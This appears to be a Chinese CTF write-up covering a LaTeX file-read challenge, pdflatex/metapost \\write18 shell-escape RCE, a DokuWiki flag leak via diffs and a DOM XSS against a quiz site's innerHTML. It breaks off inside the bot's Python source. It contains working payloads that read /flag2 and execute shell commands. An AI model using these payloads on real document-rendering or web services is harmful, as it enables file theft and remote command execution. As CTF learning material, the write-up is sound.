  * 13 = 活动角色，例如 ~
  * 14 = 注释字符，通常为 %
  * 15 = 无效字符，通常是 
payload如下：(不需要进行循环，只有一行是不行的捏)
    \newread\file 
    \openin\file=/flag2 
    \catcode`\#=11 
    \catcode`\_=11 
    \read\file to\line 
    \line 
    \closein\file
②像perl脚本一样禁用控制字符。这样就能input包含$#_&空字节。
    $$ \catcode `\$=12 \catcode `\#=12 \catcode `\_=12 \catcode `\&=12 \input{/flag2}
其中单点为下划线
③利用verbatiminput，mcfx大佬用的手法
    $$ \makeatletter
    这里放 verbatim.sty 的内容，记得删掉行末的 %
    \makeatother
    \verbatiminput{/flag2} $$
### 扩展知识：对\input和\write18原语解析，以及pdflatex导致的RCE
关于LateX找到相关文献hacking with LaTex。pdfLateX支持读写文件、执行命令，所以有可能存在rce和文件上传和包含。
来自于infosecwiteups的作者利用LateX进行RCE的过程。
下列TeX原语将命令发送到shell
    \immediate\write18{bibtex8 --wolfgang \jobname}
    \input{|bibtex8 --wolfgang \jobname}
在Ubuntu16.04，`/usr/share/texmf/wb2c/texmf.cnf`配置文件控制pdflatex()的行为。
    % Enable system commands via \write18{...}.  When enabled fully (set to
    % t), obviously insecure.  When enabled partially (set to p), only the
    % commands listed in shell_escape_commands are allowed.  Although this
    % is not fully secure either, it is much better, and so useful that we
    % enable it for everything but bare tex.
    shell_escape = p
    % No spaces in this command list.
    %
    % The programs listed here are as safe as any we know: they either do
    % not write any output files, respect openout_any, or have hard-coded
    % restrictions similar or higher to openout_any=p.  They also have no
    % features to invoke arbitrary other programs, and no known exploitable
    % bugs.  All to the best of our knowledge.  They also have practical use
    % for being called from TeX.
    %
    shell_escape_commands = \
    bibtex,bibtex8,\
    extractbb,\
    kpsewhich,\
    makeindex,\
    mpost,\
    repstopdf,\
注意shell_escape_commands，该命令能直接进行RCE。创建一个简单tex文件用于测试
    \documentclass{article}
    \begin{document}
    \immediate\write18{uname -a}
    \end{document}
    EOF
只要能实现uname -a即可rce，用strace编译如下
uname -a没有被禁，将uname换为kpsewhich搜索系统文件
    sed -i 's/uname -a/kpsewhich --imminent --pwn' x.tex
    strace -ff -e execve pdflatex x.tex
如图，成功执行，shell_escape_commands列表的任何二进制文件都能执行。注意一定要在列表内。
mp文件(metapost)也能进行RCE。x.mp代码如下：
    verbatimtex
    \documentclass{minimal}
    \begin{document}
    etex
    beginfig (1)
    label(btex blah etex, origin);
    endfig;
    \end{document}
执行`echo x.mp | strace -ff -e execve mpost -ini -tex="/bin/uname -a"`
执行命令的方式很简单，但是传递参数比较难，可以用bash直接RCE
`bash -c '(id;uname${IFS}-sm)>/tmp/pwn(本地)'`写入到x.tex
写入成功：
事实上POC需要写到pdflatex目录下，如果不在的话需要指定x.mp默认文件。-interaction=nonstomode
mpost指定允许编译.mp文件
以上内容为扩展知识，只是想说目前网页上输入latex输出Pdf的网站其实是有问题的。
## Flag的痕迹
> 小 Z 听说 Dokuwiki 配置很简单，所以在自己的机器上整了一份。可是不巧的是，他一不小心把珍贵的 flag 粘贴到了 wiki
> 首页提交了！他赶紧改好，并且也把历史记录（revisions）功能关掉了。
>
> “这样就应该就不会泄漏 flag 了吧”，小 Z 如是安慰自己。
>
> 然而事实真的如此吗？
>
> （题目 Dokuwiki 版本基于 2022-07-31a "Igor"）
参考
  * DokuWiki会利用一个特别页面显示wiki中最近被修改的页面。所有被修改页面都会在"recent"中列出。包括修改时间、修改者和修改信息。且同时提供每个页面的页面比较
  * ?do=recent就可以显示从更改日志读取的信息
但是很显然没那么简单，更改日志以及被管理员做掉了。
看WP的时候，大佬太多了，参考链接：`https://github.com/splitbrain/dokuwiki/issues/3576`
DokuWiki有差异查看器diff用以查看文档的更改，引擎代码来自MediaWiki（如果有大佬研究的话），diff甚至可以用来代替wget和tar一步到位打补丁
## 微积分计算小练习
> 小 X
> 作为某门符号计算课程的助教，为了让大家熟悉软件的使用，他写了一个小网站：上面放着五道简单的题目，只要输入姓名和题目答案，提交后就可以看到自己的分数。
>
>
> [点击此链接访问练习网站](http://202.38.93.111:10056/?token=3769%3AMEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal%2FzOg5Q5%2BRQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8%3D)
>
> 想起自己前几天在公众号上学过的 Java
> 设计模式免费试听课，本着前后端离心（咦？是前后端离心吗？还是离婚？离。。离谱？总之把功能能拆则拆就对啦）的思想，小 X
> 还单独写了一个程序，欢迎同学们把自己的成绩链接提交上来。
>
> 总之，因为其先进的设计思想，需要同学们做完练习之后手动把成绩连接贴到这里来：
>
> [点击此链接提交练习成绩
> URL](http://202.38.93.111:10057/?token=3769%3AMEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal%2FzOg5Q5%2BRQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8%3D)
>
>
> 
1.sagemath（round保留一位小数）
  * 定积分函数：definite_integral(函数,变量,下界,上界) 无穷用oo表示
​
  * 求极限：lim(函数，自变量极限)
  * 求导：derivative(函数,自变量)(自变量值)
所以答案是：
虽然是对的，但是不给flag，嘻嘻
2.XSS
随便填，提交后代码如下：
        微 积 分 计 算 小 练 习
            练习成绩页面
            您好，[[ username ]]！
            您在练习中获得的分数为 [[ score ]]/100。
            点击此链接，将页面 URL 复制到剪贴板。你可返回平台，在“提交练习成绩 URL”处提交这里复制的 URL。
            再试一次
            function click() {
                var url = window.location.href;
                var input = document.createElement('input');
                input.setAttribute('readonly', 'readonly');
                input.setAttribute('value', url);
                document.body.appendChild(input);
                input.select();
                if (document.execCommand('copy')) {
                    document.execCommand('copy');
                    alert('已复制到剪贴板');
                }
                document.body.removeChild(input);
            }
            document.querySelector("#copy").addEventListener("click", click);
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            const result = urlParams.get('result');
            const b64decode = atob(result);
            const colon = b64decode.indexOf(":");
            const score = b64decode.substring(0, colon);
            const username = b64decode.substring(colon + 1);
            document.querySelector("#greeting").innerHTML = "您好，" + username + "！";
            document.querySelector("#score").innerHTML = "您在练习中获得的分数为 " + score + "/100。";
先分析click，window.location.herf为当前打开页面，document.createElement为创建input的HTML标签。input.setAttribute向input标签填属性，和value不同的是setAttribute会直接向input添加属性而不是只改变输入框的内容。document.body.appendChild把input追加到body部分。document.execCommand()指点击链接时把url
copy到剪切板。所以click的作用就是
点击此链接，复制到剪切板
重点在于后面定义的几个常量。在页面上显示的"您好，1"和分数都在innerHTML内，但事实上innerHTML具有很大的漏洞。innerHTML虽然不执行\标签，但是XSS事件是不需要script标签进行XSS的。
windows.location.search获取url字符串，经过URLSearchParams解析后用atob解码base64,然后:签名为分数后面为用户名。
`` base64后传入result，点击图片处发生弹窗
但是不方便，用onerror，图片herf乱写是一定会加载错误的。
在bot.py里给出了提交链接的源码：
    from selenium import webdriver
    import selenium
    import sys
    import time
    import urllib.parse
    import os
    # secret.py will NOT be revealed to players
    from secret import FLAG, BOT_SECRET
    LOGIN_URL = f'http://web/?bot={BOT_SECRET}'
    print('Please submit your quiz URL:')
    url = input('> ')
    # URL replacement
    # In our environment bot access http://web
    # If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code
    # and write your own logic to use your own token to "login" with headless browser
    parsed = urllib.parse.urlparse(url)
    parsed = parsed._replace(netloc="web", scheme="http")
    url = urllib.parse.urlunparse(parsed)
    print(f"Your URL converted to {url}")
    try:
        options = webdriver.ChromeOptions()